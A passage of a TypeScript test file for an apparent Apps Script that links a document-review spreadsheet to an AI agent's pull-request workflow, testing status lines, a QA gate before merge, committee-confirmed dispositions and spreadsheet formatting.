    expect(linkLines(c)).toEqual([
      "Document (GitHub Pages): https://o.github.io/dth/",
      "Repository: https://github.com/o/dth",
      "This sheet's settings: https://github.com/o/dth/blob/main/review/drafting/sheet-sync.json",
    ]);
    const rows = configRows(c);
    expect(rows.findIndex((r) => r[0] === "Instructions - Links")).toBeLessThan(rows.findIndex((r) => r[0] === "Key"));
  });
});

describe("the Config tab's colours", () => {
  test("configTabColours", () => {
    const rows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
    const t = withConfig(tabs(), rows) as Record<string, { id: number; rows: string[][]; bg?: Record<number, string> }>;
    load(code, runtime(t).g).refreshAll();
    const bg = t.Config.bg!;
    const at = (k: string) => t.Config.rows.findIndex((r) => r[0] === k) + 1;
    expect(bg[at("Key")]).toBe("#b7b7b7");
    expect(bg[at("EDITORS")]).toBe("#f4b26b");
    for (const k of ["CFG", "COLS", "DATA"]) expect(bg[at(k)]).toBe("#efefef");
    expect(bg[at("Instructions")]).toBeUndefined();
  });
});

describe("running the script from the editor", () => {
  test("installNeverWaitsOnDialog", () => {
    const fns = [...code.matchAll(/^function (\w+)\([^)]*\) \{[\s\S]*?^\}/gm)];
    const withAlert = fns.filter((m) => /\.alert\(/.test(m[0])).map((m) => m[1]);
    expect(withAlert.sort()).toEqual(["showAbout", "showVersion"]);
  });

  test("installTriggersFirst", () => {
    expect(code.match(/^function (\w+)/m)?.[1]).toBe("installTriggers");
  });
  test("helperRunByHandSaysWhich", () => {
    const loadConfig = new Function("SpreadsheetApp", `${code}\nreturn loadConfig;`)({}) as () => void;
    expect(() => loadConfig()).toThrow(/pick installTriggers/);
  });
});

describe("the Watch hash on a public-comment sheet (owner, 2026-11-04)", () => {
  const pcRows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
  const watchCells = (edit?: (t: ReturnType<typeof tabs>) => void) => {
    const t = tabs();
    t["Review Change Sets"].rows = [
      ["Change-set", "Title", "Sections", "TWG (CS)", "Committee Feedback (CL)", "Ready for agent", "Ready for merge", "Change Set Feedback (agent)"],
      ["CS-001", "Fix scope", "", "TWG-A", "CL agrees", "", "", "A proposal"],
      ["CS-002", "Other", "", "", "", "", "", ""],
    ];
    edit?.(t);
    const rt = runtime({ ...withConfig(t, pcRows), Watch: { id: 98, rows: [["A", "B", "C", "D", "E", "F", "G", "H", "I"]] } });
    load(code, rt.g).refreshAll();
    return rt.written.Watch?.F?.[0] as string[];
  };
  const base = watchCells();
  const hash = (edit: (t: ReturnType<typeof tabs>) => void) => watchCells(edit)[1];

  test("refreshWritesCellsHash", () => {
    expect(base[0]).toBe("Cells hash");
    expect(base[1]).toMatch(/^[0-9a-z]+$/);
    expect(base[2]).toBe("Checked (UTC)");
  });
  test("personCellChangesHash", () => {
    expect(hash((t) => (t["Review Change Sets"].rows[2][5] = "Yes"))).not.toBe(base[1]);
    expect(hash((t) => (t["Review Change Sets"].rows[1][3] = "TWG-B"))).not.toBe(base[1]);
    expect(hash((t) => (t["Review Public Comments"].rows[2][6] = "CL: no"))).not.toBe(base[1]);
    expect(hash((t) => (t["Review Public Comments"].rows[3][7] = "Rejected"))).not.toBe(base[1]);
  });
  test("editWritesHashAtOnce", () => {
    const rt = runtime({ ...withConfig(tabs(), pcRows), Watch: { id: 98, rows: [["A", "B", "C", "D", "E", "F", "G", "H", "I"]] } });
    rt.props.lastMs = "20000";
    load(code, rt.g).markDirty({ range: { getSheet: () => rt.sheet("Review Change Sets") } });
    expect(rt.props.dirty).toBe("1");
    expect((rt.written.Watch?.F?.[0] as string[])[0]).toBe("Cells hash");
  });
  test("heartbeatHash", () => {
    const rt = runtime({ ...withConfig(tabs(), pcRows), Watch: { id: 98, rows: [["A", "B", "C", "D", "E", "F", "G", "H", "I"]] } });
    const s = load(code, rt.g);
    s.refreshIfDirty(); // the first tick rebuilds and records the Agent tabs' hash
    delete rt.written.Watch;
    s.refreshIfDirty();
    expect(rt.props.dirty).toBeUndefined();
    expect((rt.written.Watch?.F?.[0] as string[])[0]).toBe("Cells hash");
  });
  test("insertAndAgentNoHashChange", () => {
    expect(hash((t) => t["Review Change Sets"].rows.splice(2, 0, Array(8).fill("")))).toBe(base[1]);
    expect(hash((t) => (t["Review Change Sets"].rows[1][7] = "Another proposal"))).toBe(base[1]);
    expect(hash((t) => (t["Review Public Comments"].rows[1][8] = "Done"))).toBe(base[1]);
  });
});

describe("the committed Code.gs people copy", () => {
  test("distCodeCurrent", () => {
    const committed = readText(join(import.meta.dir, "dist", "Code.gs"), "utf8");
    expect(committed).toBe(buildScript({ stamp: "content" }));
  });
  test("installLinksStubAndLibrary", () => {
    const rows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
    const steps = rows.find((r) => r[0] === "Instructions - Install script")![1];
    expect(steps).toContain(STUB_GS_URL);
    expect(steps).toContain(LIBRARY_ID);
    expect(steps).not.toContain(CODE_GS_URL);
  });
});

describe("Ready for agent after the preview was built (owner, 2026-10-31)", () => {
  const sheets = {
    newRichTextValue: () => {
      const v = { text: "", links: [] as unknown[], bold: [] as unknown[] };
      const b = {
        setText: (t: string) => ((v.text = t), b),
        setLinkUrl: (a: number, z: number, u: string) => (v.links.push([a, z, u]), b),
        setTextStyle: (a: number, z: number, st?: { bold?: boolean }) => (st?.bold && v.bold.push([a, z]), b),
        build: () => v,
      };
      return b;
    },
    newTextStyle: textStyle,
  };
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { stagingWarning, agenticCell, progressLine, withProgress, whenLabel };`)(sheets) as {
    progressLine: (o: object) => string;
    withProgress: (t: string, l: string) => string;
    whenLabel: (at: string, now?: number) => string;
    stagingWarning: (u: string, b: object, p: object[], r?: string) => string;
    agenticCell: (s: string, p: object[], o?: object) => { text: string; links: [number, number, string][] };
  };
  const pr = { url: "https://github.com/litlfred/dth-hrh/pull/7", head: "b20534f", done: "2026-10-31 08:10Z" };
  const built = { at: "2026-10-31 08:15Z", from: "b20534f", deploy: "deployed" };

  test("stagingWarnsReadyAfterBuild", () => {
    expect(fns.stagingWarning("u", built, [pr])).toBe("");
    expect(fns.stagingWarning("u", built, [pr], "2026-10-31 11:30Z")).toBe("\u26a0 missing feedback from 2026-10-31 11:30Z");
    expect(fns.stagingWarning("u", built, [pr], "2026-10-31 08:00Z")).toBe("");
  });

  test("feedbackSaysWherePr", () => {
    const o = { prs: [pr], staging: "u", built, status: "Done" };
    expect(fns.progressLine(o)).toBe("\u23f3 dth-hrh#7 open, updated 2026-10-31 08:10Z; preview current (built 2026-10-31 08:15Z).");
    expect(fns.progressLine({ ...o, staging: "" })).toBe("\u23f3 dth-hrh#7 open, updated 2026-10-31 08:10Z; no preview yet.");
    // An Editor's Orange change is noted, not marked stale.
    const soon = Date.parse("2026-10-31T11:40:00Z"), late = Date.parse("2026-10-31T12:30:00Z");
    expect(fns.progressLine({ ...o, readyAt: "2026-10-31 11:30Z", now: soon })).toBe("\u23f3 Ready for agent set 2026-10-31 11:30Z: the agent will act on this and rewrite it.");
    // Nobody picked it up: the row says so, rather than waiting quietly for ever.
    expect(fns.progressLine({ ...o, readyAt: "2026-10-31 11:30Z", now: late })).toBe("\u23f3 Ready for agent set 2026-10-31 11:30Z: the agent will act on this and rewrite it; \u26a0 no agent has picked this up for 60 min: ask in the project chat.");
    // An idle (or proposed) step after the Ready time says the agent finished its pass.
    expect(fns.progressLine({ ...o, readyAt: "2026-10-31 11:30Z", now: late, built: { ...(o as { built?: object }).built, step: "idle 2026-10-31 11:50Z" } })).not.toMatch(/Ready for agent set/);
    expect(fns.progressLine({ ...o, merge: true, built: { ...built, gate: "Passed b20534f: dispositions match" } })).toBe("\u23f3 Ready for merge set: the agent will merge dth-hrh#7.");
    expect(fns.progressLine({ ...o, merge: true })).toBe("\u23f3 Ready for merge set: the agent will not merge dth-hrh#7 until the QA gate passes (QA gate: no independent review yet: not ready for merge).");
    expect(fns.progressLine({ ...o, status: "Working" })).toBe("\u23f3 The agent is working on dth-hrh#7.");
    expect(fns.progressLine({ ...o, status: "Merged" })).toBe("");
    expect(fns.progressLine({ prs: [] })).toBe("");
  });

  test("progressReplacedInPlace", () => {
    const stale = "\u26a0 Stale: the row changed since this proposal; the agent will propose again.";
    expect(fns.withProgress("Proposal", "\u23f3 a")).toBe("\u23f3 a\nProposal");
    expect(fns.withProgress("\u23f3 old\nProposal", "\u23f3 new")).toBe("\u23f3 new\nProposal");
    expect(fns.withProgress(stale + "\n\u23f3 old\nProposal", "\u23f3 new")).toBe(stale + "\n\u23f3 new\nProposal");
    expect(fns.withProgress("\u23f3 old\nProposal", "")).toBe("Proposal");
    expect(fns.withProgress("", "\u23f3 a")).toBe("");
  });

  test("agenticQueuedThenWho", () => {
    const q = fns.agenticCell("Done", [pr], { readyAt: "2026-10-31 11:30Z", now: Date.parse("2026-10-31T11:40:00Z") });
    expect(q.text.split("\n")[0]).toBe("Waiting on the agent since 2026-10-31 11:30Z (Ready for agent set); it has not recorded a step yet");
    // A step recorded after Ready for agent says what the agent is doing instead.
    const st = fns.agenticCell("Done", [pr], { readyAt: "2026-10-31 11:30Z", step: "editing 2026-10-31 11:47Z" });
    expect(st.text.split("\n")[0]).toMatch(/^Agent: .+ \(since (today|yesterday|\d+ days ago, 2026-10-31) 11:47Z/);
    const now = Date.parse("2026-10-31T18:00:00Z");
    expect(fns.whenLabel("2026-10-31 17:47Z", now)).toBe("today 17:47Z");
    expect(fns.whenLabel("2026-10-30 23:10Z", now)).toBe("yesterday 23:10Z");
    expect(fns.whenLabel("2026-10-28 09:05Z", now)).toBe("3 days ago, 2026-10-28 09:05Z");
    // A step older than Ready for agent is the last round's, so it still waits.
    expect(fns.agenticCell("Done", [pr], { readyAt: "2026-10-31 11:30Z", step: "editing 2026-10-31 11:00Z" }).text).toMatch(/^Waiting on the agent/);
    expect(q.text).toContain("dth-hrh#7");
    const w = fns.agenticCell("Working", [pr], { readyAt: "2026-10-31 11:30Z", talk: "https://claude.ai/code/x" });
    expect(w.text.startsWith("An agent is working on it: conversation\n")).toBe(true);
    expect(w.links.some(([, , u]) => u === "https://claude.ai/code/x")).toBe(true);
    expect(fns.agenticCell("Done", [pr]).text.startsWith("dth-hrh#7")).toBe(true);
  });
});

describe("the library stub each sheet keeps (owner, 2026-10-31: library, latest code)", () => {
  const stub = readText(join(import.meta.dir, "dist", "Stub.gs"), "utf8");
  const stubFns = [...stub.matchAll(/^function (\w+)\(/gm)].map((m) => m[1]);
  test("stubCallsExist", () => {
    for (const [, f] of stub.matchAll(/Review\.(\w+)\(/g)) expect(code).toMatch(new RegExp(`^function ${f}\\(`, "m"));
  });
  test("menuAndTriggersInStub", () => {
    const named = [...code.matchAll(/addItem\('[^']*', '(\w+)'\)/g), ...code.matchAll(/newTrigger\('(\w+)'\)/g)].map((m) => m[1]);
    expect(named.length).toBeGreaterThan(3);
    for (const f of named) expect(stubFns).toContain(f);
  });
  test("distStubCurrent", () => {
    expect(stub).toBe(readText(join(import.meta.dir, "stub.gs"), "utf8"));
  });
});

describe("the QA gate before Ready for merge (owner, 2026-10-31)", () => {
  const fake = {
    newRichTextValue: () => {
      const v = { text: "", links: [] as [number, number, string][] };
      const r = { setText: (t: string) => ((v.text = t), r), setLinkUrl: (a: number, z: number, u: string) => (v.links.push([a, z, u]), r), setTextStyle: () => r, build: () => v };
      return r;
    },
    newTextStyle: textStyle,
  };
  const { qaGate, stagingCell } = new Function("SpreadsheetApp", code + "\nreturn { qaGate, stagingCell };")(fake) as {
    qaGate: (b: object, p: object[]) => { ok: boolean; text: string };
    stagingCell: (u: string, b: object, p: object[]) => { text: string; links: [number, number, string][] };
  };
  const prs = [{ url: "https://github.com/litlfred/dth-hrh/pull/7", head: "b20534f0aa", done: "2026-10-31 08:10Z" }];
  const b = (gate: string, qa = "") => ({ at: "2026-10-31 08:15Z", from: "b20534f", deploy: "deployed", gate, qa });
  test("qaPassOnlyForHead", () => {
    expect(qaGate(b("Passed b20534f: dispositions match Blue and the diff"), prs)).toEqual({ ok: true, text: "\u2713 QA gate passed (b20534f)" });
    expect(qaGate(b("Passed 1234567"), prs).text).toBe("\u26a0 QA gate stale: reviewed 1234567, PR now at b20534f: not ready for merge");
    expect(qaGate(b("Passed: looks fine"), prs).ok).toBe(false);
    expect(qaGate(b("Failed b20534f: No. 136 Accepted but the PR does not change it"), prs).text)
      .toBe("\u26a0 QA gate failed: No. 136 Accepted but the PR does not change it");
    expect(qaGate(b(""), prs).text).toBe("\u26a0 QA gate: no independent review yet: not ready for merge");
    expect(qaGate(b("ok"), prs).ok).toBe(false);
    expect(qaGate(b(""), []).text).toBe("");
  });
  test("stagingLinksQaReport", () => {
    const c = stagingCell("https://p/", b("Passed b20534f", "https://github.com/litlfred/dth-hrh/tree/qa-reports/pr/7/b20534f"), prs);
    expect(T(c)).toBe("review \u00b7 QA report\n\u2713 QA gate passed (b20534f)");
    expect(c.links.map((l) => l[2])).toEqual(["https://p/", "https://github.com/litlfred/dth-hrh/tree/qa-reports/pr/7/b20534f"]);
  });
});

describe("the library's Update from GitHub (owner, 2026-10-31, option B)", () => {
  const upd = readText(join(import.meta.dir, "updater.gs"), "utf8");
  const isCode = new Function(upd + "\nreturn isReviewSheetCode_;")() as (t: string) => boolean;
  test("updaterDistCurrent", () => {
    expect(readText(join(import.meta.dir, "dist", "Updater.gs"), "utf8")).toBe(upd);
    expect(readText(join(import.meta.dir, "dist", "library-appsscript.json"), "utf8"))
      .toBe(readText(join(import.meta.dir, "library-appsscript.json"), "utf8"));
  });
  test("updaterRecognisesCode", () => {
    expect(isCode(readText(join(import.meta.dir, "dist", "Code.gs"), "utf8"))).toBe(true);
    expect(isCode("<!DOCTYPE html><title>404</title>")).toBe(false);
    expect(isCode(readText(join(import.meta.dir, "dist", "Stub.gs"), "utf8"))).toBe(false);
  });
  test("updaterFetchesBuiltFile", () => {
    expect(upd).toContain("'" + CODE_GS_RAW + "'");
    const scopes = JSON.parse(readText(join(import.meta.dir, "library-appsscript.json"), "utf8")).oauthScopes;
    expect(scopes).toContain("https://www.googleapis.com/auth/script.projects");
    expect(scopes).toContain("https://www.googleapis.com/auth/script.external_request");
  });
});

describe("Needs human says what the person must do (owner, 2026-10-31)", () => {
  test("needsHumanOpensWithAsk", () => {
    const sheets = {
      newRichTextValue: () => {
        const v = { text: "" };
        const b = { setText: (t: string) => ((v.text = t), b), setLinkUrl: () => b, setTextStyle: () => b, build: () => v };
        return b;
      },
      newTextStyle: textStyle,
    };
    const agenticCell = new Function("SpreadsheetApp", `${code}\nreturn agenticCell;`)(sheets);
    const t = agenticCell("Needs human", [{ url: "https://github.com/o/r/pull/1", done: "2026-10-31 10:00Z" }]).text;
    expect(t.split("\n")[0]).toMatch(/^Needs you: answer the agent's question: .*Decision needed.*Ready for agent/);
  });
});

describe("only the tags are bold in the agent's feedback (owner, 2026-11-01)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { decisionSpans };`)({}) as { decisionSpans: (t: string) => [number, number][] };
  const bold = (t: string) => fns.decisionSpans(t).map(([a, z]) => t.slice(a, z));
  test("decisionTagBold", () => {
    const t = "Proposed direction: x.\n\nDecision needed (No. 1): y?\nA. Yes\nB. No\n\nDecided (Q1): A.";
    expect(bold(t)).toEqual(["Proposed direction:", "Decision needed (No. 1):", "Decided (Q1):", "No. 1"]);
  });
  test("statusTagsBold", () => {
    const st = "\u26a0 Stale: x\n\u23f3 Needs you: answer it.\nStatus: draft.\nNext: review it.";
    expect(bold(st)).toEqual(["Stale:", "Needs you:", "Status:", "Next:"]);
    expect(bold("\u23f3 r#1 open.\nProposal")).toEqual([]);
    expect(bold("Decision needed: which?\nA. All 16 (recommended: none)\nB. None")).toEqual(["Decision needed:"]);
  });
});

describe("the ask comes first in the agent's feedback (owner, 2026-11-01)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { withProgress };`)({}) as { withProgress: (t: string, l: string) => string };
  test("bareProposalReviewAsk", () => {
    expect(fns.withProgress("Proposed direction: accept.", "").split("\n")[0]).toMatch(/^\u23f3 Please review: do you agree with the proposed direction below\?/);
  });
  test("noDecisionNoAskLine", () => {
    const out = fns.withProgress("Status: draft PR r#1.", "\u23f3 Needs you: answer the Decision needed below, then set Ready for agent to Yes.");
    expect(out).toBe("Status: draft PR r#1.");
  });
  test("decisionKeepsAskLine", () => {
    const l = "\u23f3 Needs you: answer the Decision needed below, then set Ready for agent to Yes.";
    expect(fns.withProgress("Decision needed: which?\nA. x\nB. y", l).split("\n")[0]).toBe(l);
  });
});

describe("the timer runs every minute (owner, 2026-10-31)", () => {
  test("timerMovesToOneMinute", () => {
    const made: number[] = [], removed: string[] = [];
    const app = {
      getProjectTriggers: () => [{ getHandlerFunction: () => "refreshIfDirty" }, { getHandlerFunction: () => "markDirty" }],
      deleteTrigger: (t: { getHandlerFunction: () => string }) => removed.push(t.getHandlerFunction()),
      newTrigger: () => ({ timeBased: () => ({ everyMinutes: (n: number) => ({ create: () => made.push(n) }) }) }),
    };
    const props: Record<string, string> = {};
    const p = { getProperty: (k: string) => props[k] ?? null, setProperty: (k: string, v: string) => (props[k] = v) };
    const f = new Function("SpreadsheetApp", `${code}\nreturn { init, upgradeTimer_ };`)({});
    f.init({ ScriptApp: app });
    f.upgradeTimer_(p);
    f.upgradeTimer_(p);
    expect(removed).toEqual(["refreshIfDirty"]);
    expect(made).toEqual([1]);
  });
});

describe("one agent column, status on top (owner, 2026-10-31, option A)", () => {
  const { statusBlock, withProgress, nosText, STALE } = new Function(code + "\nreturn { statusBlock, withProgress, nosText, STALE };")() as {
    statusBlock: (l: string, s: string, p: object[]) => { text: string; links: [number, number, string][] };
    withProgress: (t: string, l: unknown) => string;
    nosText: (n: string[]) => string;
    STALE: string;
  };
  const prs = [{ url: "https://github.com/litlfred/smart-ra/pull/185", done: "2026-10-31 15:26Z", desc: "DPI-F at first use" }];
  test("statusBlockLines", () => {
    const b = statusBlock("⏳ smart-ra#185 open.", "PR open", prs);
    expect(b.text).toBe("⏳ smart-ra#185 open.\n↳ smart-ra#185 (PR open, 2026-10-31 15:26Z) · DPI-F at first use");
    expect(b.links).toEqual([[23, 35, prs[0].url]]);
    expect(b.text.slice(23, 35)).toBe("smart-ra#185");
  });
  test("statusBlockReplaces", () => {
    const b = statusBlock("⏳ new.", "PR open", prs);
    const once = withProgress(STALE + "\n⏳ old.\n↳ old PR line\nProposal", b);
    expect(once).toBe(STALE + "\n" + b.text + "\nProposal");
    expect(withProgress(once, b)).toBe(once);
  });
  test("peoplesAskShows", () => {
    expect(statusBlock("", "Needs human", []).text).toMatch(/^↳ Needs you: answer the agent's question/);
  });
  test("missingDispositionCompact", () => {
    expect(nosText(["139", "127", "128", "129", "134"])).toBe("Nos. 127 to 129, 134 and 139");
  });
});

describe("Ready for agent: Yes, No, Completed (owner, 2026-10-31)", () => {
  const { completeReady } = new Function(code + "\nreturn { completeReady };")() as {
    completeReady: (s: object, csCol: number, prOf: object, stagingOf: object, builtOf: object, readyAt: object) => void;
  };
  const sheet = (ready: string) => {
    const set: string[] = [];
    const s = { header: ["Change-set", "Ready for agent"], rows: [["CS-001", ready]], top: 3,
      sh: { getRange: () => ({ setValues: (v: string[][]) => set.push(v[0][0]) }) } };
    return { s, set };
  };
  const prOf = { "CS-001": [{ url: "https://github.com/o/r/pull/1", head: "abcdef1", done: "2026-10-31 15:26Z" }] };
  const live = { "CS-001": "https://p/" }, built = { "CS-001": { at: "2026-10-31 15:30Z", from: "abcdef1", deploy: "deployed" } };
  test("completedAfterPushAndPreview", () => {
    const { s, set } = sheet("Yes");
    completeReady(s, 0, prOf, live, built, { "CS-001": "2026-10-31 14:47Z" });
    expect(set).toEqual(["Completed"]);
  });
  test("notCompletedWhileRestaging", () => {
    for (const [b, at] of [[{ ...built["CS-001"], deploy: "building" }, "2026-10-31 14:47Z"], [built["CS-001"], "2026-10-31 15:26Z"]] as const) {
      const { s, set } = sheet("Yes");
      completeReady(s, 0, prOf, live, { "CS-001": b }, { "CS-001": at });
      expect(set).toEqual([]);
    }
  });
});

describe("Disposition (agent) shows its structure (owner, 2026-10-31)", () => {
  const spans: [number, number][] = [];
  const fake = {
    newRichTextValue: () => {
      const v = { text: "" };
      const r = { setText: (t: string) => ((v.text = t), r), setLinkUrl: () => r, setTextStyle: (a: number, z: number, st?: { bold?: boolean }) => (st?.bold && spans.push([a, z]), r), build: () => v };
      return r;
    },
    newTextStyle: textStyle,
  };
  const { dispositionCell } = new Function("SpreadsheetApp", code + "\nreturn { dispositionCell };")(fake) as { dispositionCell: (t: string, n: string[], h: object) => { text: string } };
  test("dispositionLabelsBold", () => {
    const text = "Decided (No. 1, d): A.\n\nOverall: All.\nNos. 1 and 2: Partially accepted. Done.";
    const c = dispositionCell(text, ["1", "2"], {});
    expect(spans.map(([a, z]) => c.text.slice(a, z))).toEqual(["Decided (No. 1, d):", "Overall:", "Nos. 1 and 2:", "Partially accepted"]);
  });
});

describe("structured overflow lines (owner, 2026-10-31)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { descText, decisionSpans };`)({}) as {
    descText: (d: string) => string; decisionSpans: (t: string) => [number, number][];
  };
  test("semicolonsBullets", () => {
    expect(fns.descText("a (No. 326); b; c")).toBe("\n  • a (No. 326)\n  • b\n  • c");
    expect(fns.descText("only one")).toBe(" · only one");
  });
  test("labelsAndNoRefsBold", () => {
    const t = "What changed:\n  • x (No. 326)\nProposed direction: y, Nos. 1, 2 and 5.";
    const bold = fns.decisionSpans(t).map(([a, z]) => t.slice(a, z));
    expect(bold).toContain("What changed:");
    expect(bold).toContain("Proposed direction:");
    expect(bold).toContain("No. 326");
    expect(bold).toContain("Nos. 1, 2 and 5");
  });
});

describe("hover text on every column head (owner, 2026-10-31)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { headerNoteFor, headerNotes, HEADER_NOTES, NOTE_MARK };`)({}) as {
    headerNoteFor: (k: string, h: string) => string; headerNotes: (ss: unknown) => void; NOTE_MARK: string;
  };
  test("everyHeadHasNote", () => {
    const heads: [string, string[]][] = [
      ["rpc", ["No.", "Sections", "Page", "Line no(s) / Table / Figure", "Comment / issue", "Suggested revision", "Change Set", "TWG (agent)", "TWG (human)", "Comment type", "Committee Feedback (initials)", "Disposition", "Status", "Agentic status", "Staging review"]],
      ["rcs", ["Change-set", "Title", "Sections", "Pages", "Public Comments", "Suggested Revisions", "PC Committee Feedback", "Dispositions", "TWG (PCs)", "TWG (CS)", "Committee Feedback (CL)", "Architect Feedback (AB)", "Ready for agent", "Ready for merge", "Disposition (agent)", "Change Set Feedback (agent)", "Agentic status", "Staging review", "Agentic status (filter)"]],
      ["draft", ["Change-set", "Title", "Selected Sections", "Section links", "Contributor Feedback (initials/name)", "Disposition", "Ready for agent", "Ready for merge", "Issue", "Disposition (agent)", "Feedback (agent)", "Agentic status", "Agentic status (filter)", "Staging review"]],
      ["agent", ["No.", "Comment ref", "Agentic status", "Agentic action taken", "Agentic applied in (section / version)", "Agentic handled by", "Agentic date actioned", "Change-sets", "Change-set", "Title", "Issue", "Pull request (change set)", "Staging review page (change set)", "What the PRs changed (change set)", "Agent completed (UTC, change set)", "Feedback basis (change set)", "Staging built (UTC, change set)", "PR head (change set)", "Staging built from (change set)", "Staging deploy (change set)", "Disposition (change set)", "QA gate (change set)", "QA report (change set)", "Agent conversation (change set)"]],
    ];
    for (const [k, hs] of heads) for (const h of hs) expect([k, h, fns.headerNoteFor(k, h).length > 10]).toEqual([k, h, true]);
    expect(fns.headerNoteFor("rpc", "Disposition")).toMatch(/committee/);
    expect(fns.headerNoteFor("draft", "Disposition")).not.toMatch(/committee/);
  });
  test("noNoteNamesColour", () => {
    const notes = new Function("SpreadsheetApp", `${code}\nreturn HEADER_NOTES;`)({}) as Record<string, string>;
    for (const [h, n] of Object.entries(notes)) expect([h, /\b(Blue|Green|Orange|Grey)\b/.test(n)]).toEqual([h, false]);
  });
  test("knownHeadsNoted", () => {
    let written: string[][] | null = null;
    const sheet = {
      getName: () => "Review Change Sets", getLastColumn: () => 4, getLastRow: () => 5,
      getRange: (_r: number, _c: number, _nr: number, nc: number) => ({
        getDisplayValues: () => (nc === 1 ? [["Instructions"], ["Change-set"], ["CS-001"]] : [["Change-set", "Ready for agent", "Mine", "Old"]]),
        getNotes: () => [["", "an old note", "my own note", "x" + fns.NOTE_MARK]],
        setNotes: (n: string[][]) => { written = n; },
      }),
    };
    const g = new Function("SpreadsheetApp", `${code}\nCFG = { RCS: "Review Change Sets" };\nreturn headerNotes;`)({}) as (ss: unknown) => void;
    g({ getSheets: () => [sheet] });
    expect(written![0][0]).toMatch(/change set id/);
    expect(written![0][1]).toMatch(/^Yes: the direction is agreed/);
    expect(written![0][2]).toBe("my own note");
    expect(written![0][3]).toBe("");
  });
});

describe("a PR's change list may run over several lines (owner, 2026-10-31)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { prDescs, descText };`)({}) as {
    prDescs: (t: string) => string[]; descText: (d: string) => string;
  };
  test("prChangeListKeptTogether", () => {
    expect(fns.prDescs("What the PRs changed:\n• a (No. 1)\n• b")).toEqual(["What the PRs changed:\n• a (No. 1)\n• b"]);
    expect(fns.prDescs("first PR\nsecond PR")).toEqual(["first PR", "second PR"]);
    expect(fns.prDescs("one\n• x\ntwo")).toEqual(["one\n• x", "two"]);
  });
  test("labelHeadsBullets", () => {
    expect(fns.descText("What the PRs changed:\n• a (No. 1)\n• b")).toBe(" · What the PRs changed:\n  • a (No. 1)\n  • b");
  });
});

describe("unconfirmed dispositions are flagged and block the merge (owner, 2026-10-31, option A)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { dispositionProblems, progressLine };`)({}) as {
    dispositionProblems: (t: string, n: string[], h?: Record<string, string>) => string;
    progressLine: (o: object) => string;
  };
  test("unconfirmedListed", () => {
    const p = fns.dispositionProblems("No. 1: Accepted. x\nNo. 2: Noted. y\nNo. 3: Accepted. z", ["1", "2", "3"], { "1": "Pending", "2": "Noted", "3": "" });
    expect(p).toBe("⚠ Not confirmed by the committee (Disposition still Pending): Nos. 1 and 3");
    expect(fns.dispositionProblems("No. 1: Accepted. x", ["1"], {})).toBe("");
  });
  test("mergeWaitsForConfirmed", () => {
    const l = fns.progressLine({ merge: true, prs: [{ url: "https://github.com/o/r/pull/1", head: "abc1234" }], built: { gate: "Passed abc1234: ok" }, disp: "dispositions not complete or not confirmed" });
    expect(l).toMatch(/will not merge r#1 until every disposition is complete and confirmed by the committee\.$/);
  });
});

describe("Dispositions confirmed, an Editor's multi-select (owner, 2026-10-31)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { dispositionProblems, confirmedNos };`)({}) as {
    dispositionProblems: (t: string, n: string[], h?: Record<string, string>, c?: string[]) => string;
    confirmedNos: (v: string, n: string[]) => string[];
  };
  test("confirmedNosParsed", () => {
    expect(fns.confirmedNos("All", ["1", "2"])).toEqual(["1", "2"]);
    expect(fns.confirmedNos("Yes", ["1", "2"])).toEqual(["1", "2"]);
    expect(fns.confirmedNos("No", ["1", "2"])).toEqual([]);
    expect(fns.confirmedNos("No. 1, No. 3", ["1", "2"])).toEqual(["1", "3"]);
  });
  test("confirmedNotFlagged", () => {
    const t = "No. 1: Accepted. x\nNo. 2: Noted. y";
    expect(fns.dispositionProblems(t, ["1", "2"], { "1": "Pending", "2": "Pending" }, ["1", "2"])).toBe("");
    expect(fns.dispositionProblems(t, ["1", "2"], { "1": "Pending", "2": "Pending" }, ["1", "9"]))
      .toBe("⚠ Not confirmed by the committee (Disposition still Pending): No. 2\n⚠ No. 9 is confirmed but is not in this change set");
  });
});

describe("rows on the people's tabs are at most 10 lines high (owner, 2026-10-31)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { rowLines, runs };`)({}) as {
    rowLines: (v: string[], w: number[]) => number; runs: (r: number[]) => [number, number][];
  };
  test("rowLinesFromWidth", () => {
    expect(fns.rowLines(["a\nb\nc", "x".repeat(100)], [100, 78])).toBe(10);
    expect(fns.rowLines(["short"], [200])).toBe(1);
  });
  test("consecutiveRowsOneCall", () => {
    expect(fns.runs([9, 3, 4, 5])).toEqual([[3, 3], [9, 1]]);
  });
});

describe("the ⏳ line says where the agent is (owner, 2026-10-31)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { progressLine, agentStep, AGENT_STEPS };`)({}) as {
    progressLine: (o: object) => string; agentStep: (c: string) => { name: string } | null; AGENT_STEPS: Record<string, string>;
  };
  const pr = { url: "https://github.com/o/r/pull/1", head: "abc1234", done: "2026-10-31 15:26Z" };
  test("newerStepShows", () => {
    expect(fns.progressLine({ prs: [pr], built: { step: "editing 2026-10-31 17:20Z" } })).toMatch(/^⏳ Agent: editing the document \(since (today|yesterday|\d+ days ago, 2026-10-31) 17:20Z/);
  });
  test("idleOlderUnknownNothing", () => {
    expect(fns.agentStep("idle 2026-10-31 17:20Z")).toBeNull();
    expect(fns.agentStep("thinking 2026-10-31 17:20Z")).toBeNull();
    expect(fns.progressLine({ prs: [pr], staging: "", built: { step: "editing 2026-10-31 15:00Z" } })).not.toMatch(/Agent:/);
  });
  test("questionFirst", () => {
    expect(fns.progressLine({ status: "Needs human", prs: [pr], built: { step: "proposing 2026-10-31 17:20Z" } })).toMatch(/^⏳ Needs you: answer the Decision needed/);
  });
  test("toolStepsKnown", async () => {
    const { STEPS } = await import("./agent-record.ts");
    for (const s of STEPS) expect(s in fns.AGENT_STEPS).toBe(true);
  });
});

describe("the status line comes back after the agent rewrites its cell (owner, 2026-10-31)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { ownText, progressLine };`)({}) as {
    ownText: (v: string) => string; progressLine: (o: object) => string;
